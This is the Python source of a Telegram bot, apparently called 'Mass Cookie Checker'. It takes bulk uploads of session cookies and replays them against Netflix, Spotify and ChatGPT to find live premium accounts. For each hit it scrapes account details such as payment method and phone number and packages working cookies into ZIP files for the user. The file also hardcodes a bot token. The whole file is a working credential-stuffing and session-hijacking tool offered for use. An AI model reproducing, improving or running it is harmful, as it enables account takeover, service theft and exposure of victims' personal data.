import os
import re
import json
import logging
import requests
import io
import zipfile
from collections import OrderedDict
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from concurrent.futures import ThreadPoolExecutor
import asyncio
from telegram.error import BadRequest

TOKEN = "7953822748:AAEyAR0d88LbhS6mWA0rtwoJGtGPg0cl2Es"
ADMIN_CHANNEL = -1002558074652  # Set to None to fully silence admin log
logging.basicConfig(level=logging.INFO)

user_state = {}
user_executors = {}
user_tasks = {}
MAX_WORKERS_PER_USER = 10
BATCH_SIZE = 10

START_MSG = (
    "<code>\n"
    " █ MASS COOKIE CHECKER █\n\n"
    "[ Step 1 ] Choose a mode below\n"
    "[ Step 2 ] Upload .txt/.json/.zip file with cookies\n"
    "[ Step 3 ] Press \"Start Checking\"\n"
    "[ Step 4 ] Get results: All hits in ZIP at the end\n"
    "</code>"
    "<a href=\"https://t.me/S4J4G\">‎ </a>"
)
MODE_MARKUP = InlineKeyboardMarkup([
    [InlineKeyboardButton("Spotify", callback_data="mode_spotify"),
     InlineKeyboardButton("Netflix", callback_data="mode_netflix"),
     InlineKeyboardButton("ChatGPT", callback_data="mode_chatgpt")]
])

def safe_filename(name):
    return re.sub(r'[^a-zA-Z0-9_\-\.]', '_', name)

def detect_cookie_platform(text):
    text_lower = text.lower()
    platforms = set()
    if 'netflixid' in text_lower or 'securenetflixid' in text_lower:
        platforms.add('netflix')
    if '.chatgpt.com' in text_lower or 'session-token' in text_lower or 'oai-did' in text_lower or 'next-auth' in text_lower:
        platforms.add('chatgpt')
    if 'sp_dc' in text_lower or 'sp_key' in text_lower or 'spotify' in text_lower:
        platforms.add('spotify')
    return list(platforms)

def parse_cookie_file(text):
    text = text.strip()
    try:
        if text.startswith("{") or text.startswith("["):
            obj = json.loads(text)
            if isinstance(obj, dict):
                return [("json_block", obj)]
            elif isinstance(obj, list):
                out = []
                for idx, cookie in enumerate(obj):
                    if isinstance(cookie, dict):
                        if "name" in cookie and "value" in cookie:
                            out.append((f"json_{idx}", {cookie["name"]: cookie["value"]}))
                        elif "key" in cookie and "value" in cookie:
                            out.append((f"json_{idx}", {cookie["key"]: cookie["value"]}))
                        else:
                            out.append((f"json_{idx}", cookie))
                if out:
                    return out
    except Exception:
        pass

    lines = [line.strip() for line in text.splitlines() if line.strip() and not line.strip().startswith("#")]
    blocks = []
    block = []
    for line in lines:
        if (
            re.match(r"^(– |-)email:", line, re.I) or
            re.match(r"^(name|plan|created|renew|cookies|valid cookies|http)", line, re.I) or
            not line
        ):
            if block:
                blocks.append(block)
                block = []
            continue
        if "=" in line and not line.startswith("#") and not ";" in line and not line.lower().startswith("path="):
            blocks.append([line])
            continue
        block.append(line)
    if block:
        blocks.append(block)

    out = []

    for idx, block in enumerate(blocks):
        netscape = {}
        netscape_lines = 0
        for line in block:
            parts = line.split()
            if len(parts) >= 7:
                try:
                    name = parts[5]
                    value = parts[6]
                    netscape[name] = value
                    netscape_lines += 1
                except Exception:
                    continue
        if netscape_lines > 0:
            out.append((f"block_{idx}_netscape", netscape))
            continue

        for line in block:
            if ";" in line and "=" in line:
                cookie = {}
                for c in line.split(";"):
                    c = c.strip()
                    if "=" in c:
                        k, v = c.split("=", 1)
                        cookie[k.strip()] = v.strip()
                if cookie:
                    out.append((f"block_{idx}_semicolon", cookie))

        for line in block:
            if "=" in line and not line.startswith("#") and not ";" in line:
                k, v = line.split("=", 1)
                if any(x in k.lower() for x in ["session", "token", "netflixid", "securenetflixid", "sp_dc", "sp_key", "oai-did"]):
                    out.append((f"block_{idx}_{k.strip()}", {k.strip(): v.strip()}))
                elif len(v.strip()) > 20:
                    out.append((f"block_{idx}_{k.strip()}", {k.strip(): v.strip()}))

        cookie = {}
        for line in block:
            for m in re.finditer(r"([A-Za-z0-9_\-\.@]+)=([^\s;]+)", line):
                k, v = m.group(1), m.group(2)
                cookie[k] = v
        if cookie:
            out.append((f"block_{idx}_allkeys", cookie))

    for m in re.finditer(r"([A-Za-z0-9_\-\.@]*session[^=]{0,30})=([^\s;]+)", text, re.I):
        k, v = m.group(1), m.group(2)
        out.append((f"hidden_{k}", {k: v}))

    seen = set()
    unique_out = []
    for name, d in out:
        ser = json.dumps(d, sort_keys=True)
        if ser not in seen:
            unique_out.append((name, d))
            seen.add(ser)
    return unique_out

async def extract_cookies_from_zip(zip_path):
    cookies = []
    with zipfile.ZipFile(zip_path, 'r') as z:
        for info in z.infolist():
            if info.filename.lower().endswith(('.txt', '.json')):
                with z.open(info) as f:
                    try:
                        content = f.read().decode('utf-8', errors='ignore')
                        c = parse_cookie_file(content)
                        for idx, (blockname, cc) in enumerate(c):
                            cookies.append((f"{safe_filename(info.filename)}_{idx}", cc))
                    except Exception:
                        continue
    return cookies

def is_netflix_cookie(cookie_dict):
    return ("SecureNetflixId" in cookie_dict and "NetflixId" in cookie_dict) or ("NetflixId" in cookie_dict)

def is_spotify_cookie(cookie_dict):
    return "sp_dc" in cookie_dict or "sp_key" in cookie_dict

def is_chatgpt_cookie(cookie_dict):
    keys = set(cookie_dict.keys())
    for k in keys:
        if "session" in k.lower() and "token" in k.lower():
            return True
    return False

def unescape_plan(s):
    import codecs
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def check_netflix_cookie(cookie_dict):
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'}
    try:
        resp = session.get(url, headers=headers, timeout=25)
        txt = resp.text

        def find(pattern):
            m = re.search(pattern, txt)
            return m.group(1) if m else None

        plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"')
        if not plan:
            plan = find(r'"planName"\s*:\s*"([^"]+)"')
        if plan:
            plan = plan.replace("\\x20", " ").replace("\\x28", " ").replace("\\x29", " ").replace("\\u0020", " ")
            plan = unescape_plan(plan)
        else:
            plan = "Unknown"

        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
        if plan_price:
            plan_price = unescape_plan(plan_price)
        else:
            plan_price = "Unknown"

        member_since = find(r'"memberSince":"([^"]+)"')
        if member_since:
            member_since = unescape_plan(member_since)
        else:
            member_since = "Unknown"

        payment_method = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
        if not payment_method:
            payment_method = "Unknown"

        phone = find(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"')
        if phone:
            phone = phone.replace("\\x2B", "+")
        else:
            phone = "Unknown"

        phone_verified = find(r'"growthPhoneNumber":\{"__typename":"GrowthPhoneNumber","isVerified":(true|false)')
        if phone_verified:
            phone_verified = "Yes" if phone_verified == "true" else "No"
        else:
            phone_verified = "Unknown"

        video_quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
        if not video_quality:
            video_quality = "Unknown"

        max_streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
        if not max_streams:
            max_streams = "Unknown"

        payment_hold = find(r'"growthHoldMetadata":\{"__typename":"GrowthHoldMetadata","isUserOnHold":(true|false)')
        if payment_hold:
            payment_hold = "Yes" if payment_hold == "true" else "No"
        else:
            payment_hold = "Unknown"

        extra_member = find(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)')
        if extra_member:
            extra_member = "Yes" if extra_member == "true" else "No"
        else:
            extra_member = "Unknown"

        email_verified = "Yes" if re.search(r'"emailVerified"\s*:\s*true', txt) else "No"

        country = find(r'"countryOfSignup"\s*:\s*"([^"]+)"') or find(r'"countryCode"\s*:\s*"([^"]+)"') or "Unknown"

        status = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status and status.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status)
        if not is_valid and "NetflixId" in cookie_dict and "SecureNetflixId" not in cookie_dict:
            is_valid = "Account & Billing" in txt or 'membershipStatus' in txt
            is_premium = is_valid

        return {
            'ok': is_valid,
            'premium': is_premium,
            'country': country,
            'plan': plan,
            'plan_price': plan_price,
            'member_since': member_since,
            'payment_method': payment_method,
            'phone': phone,
            'phone_verified': phone_verified,
            'video_quality': video_quality,
            'max_streams': max_streams,
            'on_payment_hold': payment_hold,
            'extra_member': extra_member,
            'email_verified': email_verified,
            'cookie': cookie_dict
        }
    except Exception as e:
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def check_spotify_cookie(cookie_dict):
    try:
        session = requests.Session()
        session.cookies.update(cookie_dict)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Accept": "application/json",
        }
        resp = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer", headers=headers, timeout=20)
        if resp.status_code != 200:
            return {"ok": False, "reason": "Not logged in or invalid cookie", "cookie": cookie_dict}
        data = resp.json()
        plan = data.get("currentPlan", "unknown")
        is_premium = plan.lower() != "free"
        country = data.get("country", "unknown")
        is_recurring = data.get("isRecurring", False)
        is_trial = data.get("isTrialUser", False)
        return {
            "ok": is_premium,
            "premium": is_premium,
            "plan": plan,
            "country": country,
            "recurring": is_recurring,
            "trial": is_trial,
            "cookie": cookie_dict,
            "reason": None if is_premium else "Free plan"
        }
    except Exception as e:
        return {"ok": False, "reason": str(e), "cookie": cookie_dict}

def check_chatgpt_cookie(cookie_dict):
    url = "https://chat.openai.com/api/auth/session"
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept": "application/json",
    }
    session = requests.Session()
    session.cookies.update(cookie_dict)
    try:
        resp = session.get(url, headers=headers, timeout=25)
        if resp.status_code == 200 and is_chatgpt_cookie(cookie_dict):
            return {
                "ok": True,
                "premium": True,
                "plan": "Unknown (Login OK)",
                "expires": "",
                "cookie": cookie_dict,
            }
        elif resp.status_code == 200:
            return {
                "ok": True,
                "premium": True,
                "plan": "Unknown (Login OK, no session-token)",
                "expires": "",
                "cookie": cookie_dict,
            }
        elif resp.status_code == 401:
            return {"ok": False, "reason": "Invalid/Expired Session (401)", "cookie": cookie_dict}
        else:
            return {"ok": False, "reason": f"Failed (status {resp.status_code})", "cookie": cookie_dict}
    except Exception as e:
        return {"ok": False, "reason": str(e), "cookie": cookie_dict}
# --- Telegram Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_state.get(user_id, {}).get('busy'):
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
        ])
        await update.message.reply_html(
            "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
            reply_markup=stop_markup
        )
        return
    user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
    await update.message.reply_html(START_MSG, reply_markup=MODE_MARKUP)

async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    if user_state.get(user_id, {}).get('busy'):
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
        ])
        try:
            await query.answer()
        except BadRequest:
            pass
        await context.bot.send_message(
            chat_id, "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
            reply_markup=stop_markup
        )
        return
    user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
    if "spotify" in query.data:
        mode = "spotify"
    elif "netflix" in query.data:
        mode = "netflix"
    else:
        mode = "chatgpt"
    user_state[user_id]['mode'] = mode
    mode_display = "ChatGPT" if mode == "chatgpt" else mode.capitalize()
    try:
        await query.answer(f"Selected {mode_display} mode!")
    except BadRequest:
        pass
    await context.bot.send_message(
        chat_id, f"<b>{mode_display} mode activated!</b>\nNow please upload your .txt/.json/.zip cookie file.",
        parse_mode='HTML'
    )

async def switchmode(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    if user_id not in user_state:
        user_state[user_id] = {'mode': None, 'cookies': [], 'stop': False, 'busy': False}
    if user_state.get(user_id, {}).get('busy'):
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
        ])
        try:
            await query.answer()
        except BadRequest:
            pass
        await context.bot.send_message(
            chat_id, "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
            reply_markup=stop_markup
        )
        return
    if "spotify" in query.data:
        new_mode = "spotify"
    elif "netflix" in query.data:
        new_mode = "netflix"
    else:
        new_mode = "chatgpt"
    user_state[user_id]['mode'] = new_mode
    user_state[user_id]['cookies'] = []
    mode_display = "ChatGPT" if new_mode == "chatgpt" else new_mode.capitalize()
    try:
        await query.answer(f"Switched to {mode_display} mode!")
    except BadRequest:
        pass
    await context.bot.send_message(
        chat_id, f"<b>Switched to {mode_display} mode!</b>\nNow please upload your .txt/.json/.zip cookie file.",
        parse_mode='HTML'
    )

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    if user_id in user_tasks:
        user_tasks[user_id].cancel()
        user_state[user_id]['busy'] = False
        user_state[user_id]['stop'] = False
        try:
            await query.answer("Stopping (task cancelled)!")
        except BadRequest:
            pass
    else:
        user_state[user_id]['stop'] = True
        try:
            await query.answer("Stopping...")
        except BadRequest:
            pass

async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    if user_state.get(user_id, {}).get('busy'):
        try:
            await query.answer("A check is already running.")
        except BadRequest:
            pass
        return
    cookies = user_state.get(user_id, {}).get('cookies')
    if not cookies:
        try:
            await query.answer("No cookies loaded.")
        except BadRequest:
            pass
        return
    user_state[user_id]['stop'] = False
    user_state[user_id]['busy'] = True
    task = context.application.create_task(
        asyncio.wait_for(process_cookies(chat_id, cookies, user_id, context), timeout=600)
    )
    user_tasks[user_id] = task
    try:
        await query.answer("Started checking!")
    except BadRequest:
        pass

async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type != "private":
        return
    user_id = update.effective_user.id
    if user_state.get(user_id, {}).get('busy'):
        stop_markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("Stop Current Check", callback_data="stop_check")]
        ])
        await update.message.reply_html(
            "⚠️ Already checking cookies.\nPlease stop the current process before starting a new one.",
            reply_markup=stop_markup
        )
        return
    file = await update.message.document.get_file()
    ext = update.message.document.file_name.lower()
    import tempfile
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = os.path.join(temp_dir, update.message.document.file_name)
        await file.download_to_drive(temp_path)
        with open(temp_path, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read()
        detected_platforms = detect_cookie_platform(content)
        current_mode = user_state.get(user_id, {}).get('mode')
        if not detected_platforms:
            await update.message.reply_text("Could not detect which service these cookies are for (Netflix/Spotify/ChatGPT)!")
            return
        if current_mode not in detected_platforms:
            buttons = [[InlineKeyboardButton(p.capitalize(), callback_data=f"switchmode_{p}")] for p in detected_platforms]
            markup = InlineKeyboardMarkup(buttons)
            await update.message.reply_text(
                f"👀 Detected cookie type(s): <b>{', '.join([p.capitalize() for p in detected_platforms])}</b>.\n"
                f"Your current mode is <b>{current_mode or 'None'}</b>.\n"
                "Please switch to the correct mode before uploading.",
                reply_markup=markup,
                parse_mode='HTML'
            )
            return
        mode = user_state[user_id]['mode']
        if ext.endswith('.zip'):
            cookies = await extract_cookies_from_zip(temp_path)
        elif ext.endswith('.txt') or ext.endswith('.json'):
            cookies = []
            c = parse_cookie_file(content)
            for idx, (blockname, cc) in enumerate(c):
                cookies.append((f"{os.path.basename(temp_path)}_{idx}", cc))
        else:
            await update.message.reply_text("Unsupported file type.")
            return
    good_cookies = []
    for name, ck in cookies:
        if (mode == "netflix" and is_netflix_cookie(ck)) or \
           (mode == "spotify" and is_spotify_cookie(ck)) or \
           (mode == "chatgpt" and is_chatgpt_cookie(ck)):
            good_cookies.append((name, ck))
    if not good_cookies:
        await update.message.reply_text("No valid cookies found for this mode.")
        return
    user_state[user_id]['cookies'] = good_cookies
    check_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("Start Checking", callback_data="start_check")]
    ])
    await update.message.reply_html(
        f"Loaded {len(good_cookies)} cookie set(s) from <code>{update.message.document.file_name}</code>. Press below to start.",
        reply_markup=check_markup
    )

async def get_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    live_hits = user_state.get(user_id, {}).get('live_hits', OrderedDict())
    print("DEBUG HITS KEYS:", list(live_hits.keys()))
    if not live_hits:
        try:
            await query.answer("No hits so far.")
        except BadRequest:
            pass
        return
    zip_buffer = io.BytesIO()
    mode = user_state[user_id].get('mode', 'netflix')
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for idx, (name, details_dict) in enumerate(live_hits.items(), 1):
            country = details_dict.get('country', 'Unknown')
            if mode == 'netflix':
                details = [
                    f"Plan: {details_dict.get('plan', 'Unknown')}",
                    f"Plan Price: {details_dict.get('plan_price', 'Unknown')}",
                    f"Country: {details_dict.get('country', 'Unknown')}",
                    f"Member Since: {details_dict.get('member_since', 'Unknown')}",
                    f"Payment Method: {details_dict.get('payment_method', 'Unknown')}",
                    f"Phone: {details_dict.get('phone', 'Unknown')}",
                    f"Phone Verified: {details_dict.get('phone_verified', 'Unknown')}",
                    f"Video Quality: {details_dict.get('video_quality', 'Unknown')}",
                    f"Max Streams: {details_dict.get('max_streams', 'Unknown')}",
                    f"On Payment Hold: {details_dict.get('on_payment_hold', 'Unknown')}",
                    f"Extra Member: {details_dict.get('extra_member', 'Unknown')}",
                    f"Email Verified: {details_dict.get('email_verified', 'Unknown')}",
                    ""
                ]
            else:
                details = [
                    f"Plan: {details_dict.get('plan', 'Unknown')}",
                    f"Country: {details_dict.get('country', 'Unknown')}",
                    ""
                ]
            cookie_lines = [f"{k}={v}" for k, v in details_dict.get('cookie', {}).items()]
            file_content = "\n".join(details) + "Cookie ↓\n" + "\n".join(cookie_lines)
            txt_filename = f"Live Cookie @S4J4G ({country}) {idx}.txt"
            zipf.writestr(txt_filename, file_content)
    zip_buffer.seek(0)
    await context.bot.send_document(
        chat_id,
        document=InputFile(zip_buffer, filename="Current_Live_Hits.zip"),
        caption=f"🔄 Current hits so far: {len(live_hits)}"
    )
    try:
        await query.answer("Sent current hits.")
    except BadRequest:
        pass

async def process_cookies(chat_id, cookies, user_id, context):
    checked, hits, fails, free = 0, 0, 0, 0
    total = len(cookies)
    dot_length = 12
    reply_markup = InlineKeyboardMarkup([
        [InlineKeyboardButton("Stop", callback_data="stop_check"),
         InlineKeyboardButton("Get Hits", callback_data="get_hits")]
    ])
    mode = user_state[user_id]['mode']
    mode_display = "ChatGPT" if mode == "chatgpt" else mode.capitalize()
    progress_msg = (
        f"<b>{mode_display} Cookie Checking</b>\n"
        f"<code>{'○'*dot_length}</code>  0/{total}\n"
        + (
            f"Hits: <b>0</b> | Fails: <b>0</b>" if mode == "chatgpt" else
            f"Hits: <b>0</b> | Free: <b>0</b> | Fails: <b>0</b>"
        )
    )
    msg = await context.bot.send_message(chat_id, progress_msg, parse_mode='HTML', reply_markup=reply_markup)
    msg_id = msg.message_id
    preview_msg = await context.bot.send_message(chat_id, "<b>Preview of hits will appear here...</b>", parse_mode='HTML')
    preview_msg_id = preview_msg.message_id

    if user_id not in user_executors:
        user_executors[user_id] = ThreadPoolExecutor(max_workers=MAX_WORKERS_PER_USER)
    executor = user_executors[user_id]

    live_hits = OrderedDict()
    user_state[user_id]['live_hits'] = live_hits

    try:
        for batch_start in range(0, len(cookies), BATCH_SIZE):
            batch = cookies[batch_start:batch_start+BATCH_SIZE]
            if user_state.get(user_id, {}).get('stop'):
                break

            loop = asyncio.get_running_loop()
            futures = []
            for name, cookie in batch:
                if mode == 'spotify':
                    fut = loop.run_in_executor(executor, check_spotify_cookie, cookie)
                elif mode == 'netflix':
                    fut = loop.run_in_executor(executor, check_netflix_cookie, cookie)
                elif mode == 'chatgpt':
                    fut = loop.run_in_executor(executor, check_chatgpt_cookie, cookie)
                else:
                    fut = loop.run_in_executor(executor, lambda x: {'ok': False, 'reason': 'Unknown mode', 'cookie': x}, cookie)
                futures.append(asyncio.wait_for(fut, timeout=30))

            try:
                results = await asyncio.gather(*futures, return_exceptions=True)
            except asyncio.CancelledError:
                break

            for i, result in enumerate(results):
                checked += 1
                if isinstance(result, Exception):
                    result = {'ok': False, 'reason': str(result), 'cookie': batch[i][1]}
                # Add hit for all valid modes
                if result.get("ok") and (mode != "netflix" or result.get("premium", False)):
                    hits += 1
                    print(f"DEBUG: Adding hit {hits}: {result}")
                    live_hits[f"Hit_{hits}"] = result
                    user_state[user_id]['live_hits'] = live_hits
                    if mode == "netflix":
                        details = [
                            f"Plan: {result.get('plan', 'Unknown')}",
                            f"Plan Price: {result.get('plan_price', 'Unknown')}",
                            f"Country: {result.get('country', 'Unknown')}",
                            f"Member Since: {result.get('member_since', 'Unknown')}",
                            f"Payment Method: {result.get('payment_method', 'Unknown')}",
                            f"Phone: {result.get('phone', 'Unknown')}",
                            f"Phone Verified: {result.get('phone_verified', 'Unknown')}",
                            f"Video Quality: {result.get('video_quality', 'Unknown')}",
                            f"Max Streams: {result.get('max_streams', 'Unknown')}",
                            f"On Payment Hold: {result.get('on_payment_hold', 'Unknown')}",
                            f"Extra Member: {result.get('extra_member', 'Unknown')}",
                            f"Email Verified: {result.get('email_verified', 'Unknown')}"
                        ]
                        preview_content = "\n".join(details)
                        await context.bot.edit_message_text(
                            chat_id=chat_id, message_id=preview_msg_id,
                            text=f"<b>Hit #{hits} Preview:</b>\n<pre>{preview_content}</pre>", parse_mode='HTML'
                        )
                elif mode == "netflix" and result.get("ok"):
                    free += 1
                else:
                    fails += 1

            dots_done = checked * dot_length // total
            dots_left = dot_length - dots_done
            dot_bar = '●' * dots_done + '○' * dots_left
            if mode == "chatgpt":
                progress_msg = (
                    f"<b>{mode_display} Cookie Checking</b>\n"
                    f"<code>{dot_bar}</code>  {checked}/{total}\n"
                    f"Hits: <b>{hits}</b> | Fails: <b>{fails}</b>"
                )
            else:
                progress_msg = (
                    f"<b>{mode_display} Cookie Checking</b>\n"
                    f"<code>{dot_bar}</code>  {checked}/{total}\n"
                    f"Hits: <b>{hits}</b> | Free: <b>{free}</b> | Fails: <b>{fails}</b>"
                )
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=progress_msg,
                parse_mode='HTML', reply_markup=reply_markup
            )
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass
    finally:
        user_state[user_id]['busy'] = False
        user_state[user_id]['stop'] = False
        if user_id in user_executors:
            user_executors[user_id].shutdown(wait=False)
            del user_executors[user_id]
        if user_id in user_tasks:
            del user_tasks[user_id]

    # At end, send ZIP of all hits if any
    print("FINAL DEBUG HITS KEYS:", list(live_hits.keys()))
    if hits:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for idx, (name, details_dict) in enumerate(live_hits.items(), 1):
                country = details_dict.get('country', 'Unknown')
                if mode == 'netflix':
                    details = [
                        f"Plan: {details_dict.get('plan', 'Unknown')}",
                        f"Plan Price: {details_dict.get('plan_price', 'Unknown')}",
                        f"Country: {details_dict.get('country', 'Unknown')}",
                        f"Member Since: {details_dict.get('member_since', 'Unknown')}",
                        f"Payment Method: {details_dict.get('payment_method', 'Unknown')}",
                        f"Phone: {details_dict.get('phone', 'Unknown')}",
                        f"Phone Verified: {details_dict.get('phone_verified', 'Unknown')}",
                        f"Video Quality: {details_dict.get('video_quality', 'Unknown')}",
                        f"Max Streams: {details_dict.get('max_streams', 'Unknown')}",
                        f"On Payment Hold: {details_dict.get('on_payment_hold', 'Unknown')}",
                        f"Extra Member: {details_dict.get('extra_member', 'Unknown')}",
                        f"Email Verified: {details_dict.get('email_verified', 'Unknown')}",
                        ""
                    ]
                else:
                    details = [
                        f"Plan: {details_dict.get('plan', 'Unknown')}",
                        f"Country: {details_dict.get('country', 'Unknown')}",
                        ""
                    ]
                cookie_lines = [f"{k}={v}" for k, v in details_dict.get('cookie', {}).items()]
                file_content = "\n".join(details) + "Cookie ↓\n" + "\n".join(cookie_lines)
                txt_filename = f"Live Cookie @S4J4G ({country}) {idx}.txt"
                zipf.writestr(txt_filename, file_content)
        zip_buffer.seek(0)
        await context.bot.send_document(
            chat_id,
            document=InputFile(zip_buffer, filename="Le re Lund Ke Teri Cookies.zip"),
            caption=f"✅ Done!\nChecked: {checked}\nHits: {hits} | Fails: {fails}" +
            ("" if mode == "chatgpt" else f" | Free: {free}") + "\nAll hits in ZIP."
        )
    else:
        await context.bot.send_message(
            chat_id,
            f"✅ Done!\nChecked: {checked}\nHits: 0 | Fails: {fails}" +
            ("" if mode == "chatgpt" else f" | Free: {free}") +
            "\n<b>No premium hits found.</b>",
            parse_mode='HTML'
        )
    try:
        if ADMIN_CHANNEL and ADMIN_CHANNEL < 0:
            await context.bot.send_message(
                ADMIN_CHANNEL,
                f"User <a href='tg://user?id={user_id}'>{user_id}</a> checked {checked} cookies in {mode_display} mode.\nHits: {hits} | Fails: {fails}" +
                ("" if mode == "chatgpt" else f" | Free: {free}"),
                parse_mode='HTML'
            )
    except Exception:
        pass

if __name__ == "__main__":
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(mode_button, pattern="^mode_(spotify|netflix|chatgpt)$"))
    app.add_handler(CallbackQueryHandler(switchmode, pattern="^switchmode_(spotify|netflix|chatgpt)$"))
    app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_check$"))
    app.add_handler(CallbackQueryHandler(start_check, pattern="^start_check$"))
    app.add_handler(CallbackQueryHandler(get_hits, pattern="^get_hits$"))
    app.add_handler(MessageHandler(filters.Document.ALL & ~filters.COMMAND, file_upload))
    app.run_polling()
